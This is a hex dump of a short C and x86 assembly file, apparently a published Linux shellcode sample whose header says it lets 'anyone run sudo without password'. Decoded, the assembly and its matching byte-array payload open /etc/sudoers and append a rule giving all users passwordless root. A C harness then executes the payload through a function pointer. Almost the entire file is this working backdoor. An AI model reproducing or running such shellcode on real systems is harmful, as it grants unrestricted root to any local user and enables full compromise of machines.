00000000  2f 2a 0d 0a 41 75 74 68  6f 72 3a 20 52 69 63 6b  |/*..Author: Rick|
00000010  0d 0a 45 6d 61 69 6c 3a  20 72 69 63 6b 32 36 30  |..Email: rick260|
00000020  30 40 68 6f 74 6d 61 69  6c 2e 63 6f 6d 0d 0a 0d  |0@hotmail.com...|
00000030  0a 4f 53 3a 20 4c 69 6e  75 78 2f 78 38 36 0d 0a  |.OS: Linux/x86..|
00000040  44 65 73 63 72 69 70 74  69 6f 6e 3a 20 41 6e 79  |Description: Any|
00000050  6f 6e 65 20 63 61 6e 20  72 75 6e 20 73 75 64 6f  |one can run sudo|
00000060  20 77 69 74 68 6f 75 74  20 70 61 73 73 77 6f 72  | without passwor|
00000070  64 0d 0a 0d 0a 73 65 63  74 69 6f 6e 20 2e 74 65  |d....section .te|
00000080  78 74 0d 0a 09 67 6c 6f  62 61 6c 20 5f 73 74 61  |xt...global _sta|
00000090  72 74 0d 0a 0d 0a 5f 73  74 61 72 74 3a 0d 0a 0d  |rt...._start:...|
000000a0  0a 09 3b 6f 70 65 6e 28  22 2f 65 74 63 2f 73 75  |..;open("/etc/su|
000000b0  64 6f 65 72 73 22 2c 20  4f 5f 57 52 4f 4e 4c 59  |doers", O_WRONLY|
000000c0  20 7c 20 4f 5f 41 50 50  45 4e 44 29 3b 0d 0a 09  | | O_APPEND);...|
000000d0  78 6f 72 20 65 61 78 2c  20 65 61 78 0d 0a 09 70  |xor eax, eax...p|
000000e0  75 73 68 20 65 61 78 0d  0a 09 70 75 73 68 20 30  |ush eax...push 0|
000000f0  78 37 33 37 32 36 35 36  66 20 0d 0a 09 70 75 73  |x7372656f ...pus|
00000100  68 20 30 78 36 34 37 35  37 33 32 66 0d 0a 09 70  |h 0x6475732f...p|
00000110  75 73 68 20 30 78 36 33  37 34 36 35 32 66 0d 0a  |ush 0x6374652f..|
00000120  09 6d 6f 76 20 65 62 78  2c 20 65 73 70 0d 0a 09  |.mov ebx, esp...|
00000130  6d 6f 76 20 63 78 2c 20  30 78 34 30 31 0d 0a 09  |mov cx, 0x401...|
00000140  6d 6f 76 20 61 6c 2c 20  30 78 30 35 0d 0a 09 69  |mov al, 0x05...i|
00000150  6e 74 20 30 78 38 30 0d  0a 0d 0a 09 6d 6f 76 20  |nt 0x80.....mov |
00000160  65 62 78 2c 20 65 61 78  20 20 0d 0a 0d 0a 09 3b  |ebx, eax  .....;|
00000170  77 72 69 74 65 28 66 64  2c 20 41 4c 4c 20 41 4c  |write(fd, ALL AL|
00000180  4c 3d 28 41 4c 4c 29 20  4e 4f 50 41 53 53 57 44  |L=(ALL) NOPASSWD|
00000190  3a 20 41 4c 4c 5c 6e 2c  20 6c 65 6e 29 3b 0d 0a  |: ALL\n, len);..|
000001a0  09 78 6f 72 20 65 61 78  2c 20 65 61 78 0d 0a 09  |.xor eax, eax...|
000001b0  70 75 73 68 20 65 61 78  0d 0a 09 70 75 73 68 20  |push eax...push |
000001c0  30 78 30 61 34 63 34 63  34 31 0d 0a 09 70 75 73  |0x0a4c4c41...pus|
000001d0  68 20 30 78 32 30 33 61  34 34 35 37 0d 0a 09 70  |h 0x203a4457...p|
000001e0  75 73 68 20 30 78 35 33  35 33 34 31 35 30 0d 0a  |ush 0x53534150..|
000001f0  09 70 75 73 68 20 30 78  34 66 34 65 32 30 32 39  |.push 0x4f4e2029|
00000200  0d 0a 09 70 75 73 68 20  30 78 34 63 34 63 34 31  |...push 0x4c4c41|
00000210  32 38 0d 0a 09 70 75 73  68 20 30 78 33 64 34 63  |28...push 0x3d4c|
00000220  34 63 34 31 0d 0a 09 70  75 73 68 20 30 78 32 30  |4c41...push 0x20|
00000230  34 63 34 63 34 31 0d 0a  09 6d 6f 76 20 65 63 78  |4c4c41...mov ecx|
00000240  2c 20 65 73 70 0d 0a 09  6d 6f 76 20 64 6c 2c 20  |, esp...mov dl, |
00000250  30 78 31 63 0d 0a 09 6d  6f 76 20 61 6c 2c 20 30  |0x1c...mov al, 0|
00000260  78 30 34 0d 0a 09 69 6e  74 20 30 78 38 30 0d 0a  |x04...int 0x80..|
00000270  0d 0a 09 3b 63 6c 6f 73  65 28 66 69 6c 65 29 0d  |...;close(file).|
00000280  0a 09 6d 6f 76 20 61 6c  2c 20 30 78 30 36 0d 0a  |..mov al, 0x06..|
00000290  09 69 6e 74 20 30 78 38  30 0d 0a 0d 0a 09 3b 65  |.int 0x80.....;e|
000002a0  78 69 74 28 30 29 3b 0d  0a 09 78 6f 72 20 65 62  |xit(0);...xor eb|
000002b0  78 2c 20 65 62 78 0d 0a  09 6d 6f 76 20 61 6c 2c  |x, ebx...mov al,|
000002c0  20 30 78 30 31 0d 0a 09  69 6e 74 20 30 78 38 30  | 0x01...int 0x80|
000002d0  0d 0a 0d 0a 2a 2f 0d 0a  0d 0a 23 69 6e 63 6c 75  |....*/....#inclu|
000002e0  64 65 20 22 73 74 64 69  6f 2e 68 22 0d 0a 23 69  |de "stdio.h"..#i|
000002f0  6e 63 6c 75 64 65 20 22  73 74 72 69 6e 67 2e 68  |nclude "string.h|
00000300  22 0d 0a 0d 0a 63 68 61  72 20 63 6f 64 65 5b 5d  |"....char code[]|
00000310  20 3d 0d 0a 22 5c 78 33  31 5c 78 63 30 5c 78 35  | =.."\x31\xc0\x5|
00000320  30 5c 78 36 38 5c 78 36  66 5c 78 36 35 5c 78 37  |0\x68\x6f\x65\x7|
00000330  32 5c 78 37 33 5c 78 36  38 5c 78 32 66 5c 78 37  |2\x73\x68\x2f\x7|
00000340  33 5c 78 37 35 5c 78 36  34 22 0d 0a 22 5c 78 36  |3\x75\x64".."\x6|
00000350  38 5c 78 32 66 5c 78 36  35 5c 78 37 34 5c 78 36  |8\x2f\x65\x74\x6|
00000360  33 5c 78 38 39 5c 78 65  33 5c 78 36 36 5c 78 62  |3\x89\xe3\x66\xb|
00000370  39 5c 78 30 31 5c 78 30  34 5c 78 62 30 5c 78 30  |9\x01\x04\xb0\x0|
00000380  35 22 0d 0a 22 5c 78 63  64 5c 78 38 30 5c 78 38  |5".."\xcd\x80\x8|
00000390  39 5c 78 63 33 5c 78 33  31 5c 78 63 30 5c 78 35  |9\xc3\x31\xc0\x5|
000003a0  30 5c 78 36 38 5c 78 34  31 5c 78 34 63 5c 78 34  |0\x68\x41\x4c\x4|
000003b0  63 5c 78 30 61 5c 78 36  38 22 0d 0a 22 5c 78 35  |c\x0a\x68".."\x5|
000003c0  37 5c 78 34 34 5c 78 33  61 5c 78 32 30 5c 78 36  |7\x44\x3a\x20\x6|
000003d0  38 5c 78 35 30 5c 78 34  31 5c 78 35 33 5c 78 35  |8\x50\x41\x53\x5|
000003e0  33 5c 78 36 38 5c 78 32  39 5c 78 32 30 5c 78 34  |3\x68\x29\x20\x4|
000003f0  65 22 0d 0a 22 5c 78 34  66 5c 78 36 38 5c 78 32  |e".."\x4f\x68\x2|
00000400  38 5c 78 34 31 5c 78 34  63 5c 78 34 63 5c 78 36  |8\x41\x4c\x4c\x6|
00000410  38 5c 78 34 31 5c 78 34  63 5c 78 34 63 5c 78 33  |8\x41\x4c\x4c\x3|
00000420  64 5c 78 36 38 5c 78 34  31 22 0d 0a 22 5c 78 34  |d\x68\x41".."\x4|
00000430  63 5c 78 34 63 5c 78 32  30 5c 78 38 39 5c 78 65  |c\x4c\x20\x89\xe|
00000440  31 5c 78 62 32 5c 78 31  63 5c 78 62 30 5c 78 30  |1\xb2\x1c\xb0\x0|
00000450  34 5c 78 63 64 5c 78 38  30 5c 78 62 30 5c 78 30  |4\xcd\x80\xb0\x0|
00000460  36 22 0d 0a 22 5c 78 63  64 5c 78 38 30 5c 78 33  |6".."\xcd\x80\x3|
00000470  31 5c 78 64 62 5c 78 62  30 5c 78 30 31 5c 78 63  |1\xdb\xb0\x01\xc|
00000480  64 5c 78 38 30 22 3b 0d  0a 0d 0a 76 6f 69 64 20  |d\x80";....void |
00000490  6d 61 69 6e 28 76 6f 69  64 29 20 7b 0d 0a 09 0d  |main(void) {....|
000004a0  0a 09 76 6f 69 64 20 28  2a 73 68 65 6c 6c 63 6f  |..void (*shellco|
000004b0  64 65 29 28 29 20 3d 20  63 6f 64 65 3b 0d 0a 09  |de)() = code;...|
000004c0  73 68 65 6c 6c 63 6f 64  65 28 29 3b 0d 0a 09 0d  |shellcode();....|
000004d0  0a 7d                                             |.}|
000004d2
